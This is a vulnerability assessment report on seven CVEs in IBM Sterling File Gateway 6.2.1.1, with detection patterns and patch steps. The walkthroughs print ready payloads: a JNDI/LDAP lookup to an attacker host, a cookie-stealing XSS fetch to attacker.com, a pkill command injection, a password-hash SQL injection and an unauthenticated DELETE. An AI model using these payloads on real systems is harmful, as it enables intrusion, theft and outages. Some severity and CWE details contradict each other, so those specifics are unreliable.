# Professional Vulnerability Assessment: IBM Sterling File Gateway 6.2.1.1
**Prepared for:** Security Operations & Audit Teams  
**Subject:** Technical Breakdown of Critical/High Severity Vulnerabilities (2025-2026 Disclosure Series)  
**Status:** REMEDIATION REQUIRED (Fix Pack 6.2.1.1_2)

---

## 1. Risk Executive Summary

This report documents a series of critical security flaws identified in **IBM Sterling B2B Integrator and File Gateway version 6.2.1.1**. These vulnerabilities encompass unauthenticated remote code execution (RCE), authentication bypass, and denial-of-service (DoS) vectors. Rapid remediation is advised to prevent unauthorized data exfiltration and total service disruption.

### Priority Vulnerability Matrix

| CVE ID | Severity | CVSS | Vulnerability Type | Primary Impact | APAR / Fix |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **CVE-2025-48913** | **Critical** | 9.8 | JNDI RCE (CWE-20) | Full System Takeover | IT49161 |
| **CVE-2025-14031** | **High** | 7.5 | Command DoS (CWE-77) | Service Shutdown | IT48828 |
| **CVE-2025-59250** | **High** | 8.1 | JDBC Spoofing (CWE-20) | Network MITM | IT49161 |
| **CVE-2026-1264** | **Critical** | 7.1 | Auth Bypass (CWE-306) | Community Deletion | IT48934 |
| **CVE-2025-36368** | **Medium** | 6.5 | SQL Injection (CWE-89) | Database Exfiltration | IT49195 |
| **CVE-2026-0835** | **Medium** | 5.4 | Reflected XSS (CWE-79) | Session Hijacking | IT48934 |
| **CVE-2025-14483** | **Low** | 4.3 | Info Disclosure (CWE-201)| Reconnaissance Leak | IT49221 |

---

## 2. Technical Deep-Dives & Walkthroughs

### 2.1 CVE-2025-48913: Apache CXF Remote Code Execution (RCE)
> **CVSS: 9.8 (Critical)** | **APAR: IT49161**

*   **Detailed Description**: This critical flaw resides in the Apache CXF JMS transport layer (cxf-rt-transports-jms). It is a classic **JNDI Injection** vulnerability where the application fails to validate JMS connection factory properties.
*   **Root Cause**: CWE-917. The vulnerability is triggered when the CXF library attempts to resolve a JMS Destination using an attacker-influenced JNDI lookup.
*   **Exact Endpoint**: Any administrative or integration endpoint that allows configuration of JMS Address URIs.
*   **Attack Payload**:
    ```text
    jms:jndi:jndiConnectionFactoryName=MyFactory&jndiInitialContextFactory=com.sun.jndi.ldap.LdapCtxFactory&jndiURL=ldap://attacker-controlled-server.com:1389/Exploit
    ```
*   **Mechanism**: Forces the server to connect to a malicious LDAP server, download a remote Java factory class, and execute its bytecode, leading to full shell access.

### 2.2 CVE-2026-1264: Advanced File Transfer (AFT) Auth Bypass
> **CVSS: 7.1 (Critical)** | **APAR: IT48934**

*   **Detailed Description**: A fundamental access control failure in the AFT web application. Certain API routes for "Community" and "Partner" management were not bound to the authentication filter.
*   **Root Cause**: CWE-306 (Missing Authentication for Critical Function). Admin endpoints lack session token verification.
*   **Exact Endpoint**:
    *   `GET /aft/community` (List all communities)
    *   `DELETE /aft/community/{id}` (Purge a community)
    *   `GET /aft/partner` (Extract partner metadata)
*   **Burp Suite Payload**:
    ```http
    DELETE /aft/community/COMM_DEFN_ROOT HTTP/1.1
    Host: target-ibm-sfg.com:58001
    /* No Authorization Header or Cookie Required */
    ```
*   **Impact**: An unauthenticated attacker can disable the entire transfer ecosystem by systematically deleting communities.

### 2.3 CVE-2025-14031: Operations Server Denial of Service (DoS)
> **CVSS: 7.5 (High)** | **APAR: IT48828**

*   **Detailed Description**: The Operations (Ops) Server health-monitoring component is susceptible to unhandled exceptions when processing malformed telemetry packets.
*   **Root Cause**: CWE-77. Improper neutralization of shell-like metadata (e.g., null bytes or redirection operators) in request parameters.
*   **Exact Endpoint**: `/ops/monitoring` or `/ops/ping`.
*   **Burp Suite Payload**:
    ```http
    GET /ops/monitoring?host=127.0.0.1&cmd=$(pkill%20-9%20java) HTTP/1.1
    Host: target-ibm-sfg.com:8443
    ```
*   **Impact**: Triggers a JVM crash or a `NullPointerException` that shuts down the node's monitoring and processing capabilities.

### 2.4 CVE-2025-59250: MSSQL JDBC Driver Spoofing
> **CVSS: 8.1 (High)** | **APAR: IT49161**

*   **Detailed Description**: A vulnerability in the Microsoft JDBC driver for SQL Server allows for network-based identity spoofing.
*   **Root Cause**: CWE-20 (Improper Input Validation). The driver fails to adequately validate the database server's identity during the initial TLS handshake.
*   **Exact Endpoint**: Port `1433` (JDBC Connection Layer).
*   **Attack Payload**: Man-in-the-Middle (MitM) interception using a spoofed certificate.
*   **Impact**: Attackers can intercept database credentials or inject malicious records into the application's data stream.

### 2.5 CVE-2025-36368: Administrative SQL Injection
> **CVSS: 6.5 (Medium)** | **APAR: IT49195**

*   **Detailed Description**: Authenticated administrators can bypass query logic to exfiltrate database content via search bars in the Dashboard UI.
*   **Root Cause**: CWE-89. Lack of parameterized queries (String concatenation) in the `SearchPartners` and `AuditLog` modules.
*   **Exact Endpoint**: `/dashboard/Manager?action=SearchPartners`
*   **Attack Payload**:
    ```sql
    ' UNION SELECT USERNAME, PASSWORD_HASH FROM APP_USER --
    ```
*   **Impact**: Compromise of administrative credentials and bypassing database-level object permissions.

### 2.6 CVE-2026-0835: Reflected XSS in AFT
> **CVSS: 5.4 (Medium)** | **APAR: IT48934**

*   **Detailed Description**: A malicious script can be reflected off the AFT application error pages to hijack administrator sessions.
*   **Root Cause**: CWE-79. The application echoes URL parameters back to the browser without HTML encoding.
*   **Exact Endpoint**: `/aft/ErrorPage.jsp?errorMsg=`
*   **Attack Payload**:
    ```text
    <script>fetch('https://attacker.com/log?c=' + document.cookie)</script>
    ```
*   **Impact**: Session hijacking via stealing `JSESSIONID` cookies.

### 2.7 CVE-2025-14483: Host Information Disclosure
> **CVSS: 4.3 (Low)** | **APAR: IT49221**

*   **Detailed Description**: The application inadvertently includes environmental system context in its JSON/XML metadata responses.
*   **Root Cause**: CWE-201. Insertion of sensitive information into sent data.
*   **Exact Endpoint**: `/dashboard/Manager?action=nodeDetails`
*   **Payload Example (Leaked Response)**:
    ```json
    {
      "internalIp": "10.155.4.12",
      "installPath": "/opt/ibm/sterling/b2bi_install/node_1/"
    }
    ```
*   **Impact**: Critical reconnaissance data that assists in lateral movement and OS-specific attack tailoring.

---

## 3. SOC Detection & Monitoring (IoCs)

To detect exploitation attempts in real-time, the following patterns should be monitored:

| Threat | Log Pattern / Regex | Alert Level |
| :--- | :--- | :--- |
| **AFT Bypass** | `HTTP 200` to `/aft/community` without a `JSESSIONID` | **Critical** |
| **JNDI RCE** | `(?i)jndi:(ldap|rmi|dns|iiop|corba):` in HTTP POST bodies | **Critical** |
| **SQLi** | `UNION SELECT` or `OR 1=1` in the `http_access.log` | **High** |
| **Ops DoS** | `NullPointerException` followed by `SIGTERM` in `ops.log` | **High** |

---

## 4. Remediation Plan

The primary remediation strategy for all identified risks is the application of **Fix Pack 6.2.1.1_2**.

1.  **Download**: Obtain `6.2.1.1-OtherSoftware-B2Bi-All-IF0001` from IBM Fix Central.
2.  **Environment**: Test the patch on a non-production node running **Java 17 (Semeru Runtime)**.
3.  **Deployment**: 
    *   For IIM: Use the IBM Installation Manager to apply the Update.
    *   For Containers: Pull the updated images from the **IBM Entitled Registry**.
4.  **Verification**: Execute the Python AFT verification script to ensure unauthenticated requests now return `401 Unauthorized` or `302 Redirect`.
